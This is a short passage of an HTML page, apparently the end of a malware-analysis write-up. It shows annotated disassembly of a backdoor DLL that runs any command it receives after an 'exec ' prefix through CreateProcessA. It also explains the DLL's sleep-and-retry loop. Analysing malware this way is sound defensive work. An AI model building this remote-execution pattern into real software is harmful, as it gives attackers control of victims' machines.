+<span class="err">0</span><span class="nf">x1000119B</span>    <span class="nv">lea</span>     <span class="nb">edx</span><span class="p">,</span> <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">1224h</span><span class="o">+</span><span class="nv">data_received</span><span class="o">+</span><span class="mi">5</span><span class="p">]</span> <span class="c1">; -&gt;after "exec "</span>
+<span class="err">0</span><span class="nf">x100011A2</span>    <span class="nv">push</span>    <span class="mi">0</span>               <span class="c1">; lpProcessAttributes</span>
+<span class="err">0</span><span class="nf">x100011A4</span>    <span class="nv">push</span>    <span class="nb">edx</span>             <span class="c1">; lpCommandLine</span>
+<span class="err">0</span><span class="nf">x100011A5</span>    <span class="nv">push</span>    <span class="mi">0</span>               <span class="c1">; lpApplicationName</span>
+<span class="err">0</span><span class="nf">x100011A7</span>    <span class="nv">mov</span>     <span class="p">[</span><span class="nb">esp</span><span class="o">+</span><span class="mh">1230h</span><span class="o">+</span><span class="nv">StartupInfo.cb</span><span class="p">],</span> <span class="mh">44h</span>
+<span class="err">0</span><span class="nf">x100011AF</span>    <span class="nv">call</span>    <span class="nb">ebx</span> <span class="c1">; CreateProcessA</span>
+<span class="err">0</span><span class="nf">x100011B1</span>    <span class="nv">jmp</span>     <span class="nv">retry</span>
+</code></pre></div>    </div>
+    <p>If an unrecognised commmand is received, the DLL sleeps for 0x60000 milliseconds and loops to the sending of the <em>hello</em> string.</p>
+  </li>
+</ol>
+
+
+
+    </main><footer>
+  
+</footer>
+</div>
+  </body>
+</html>
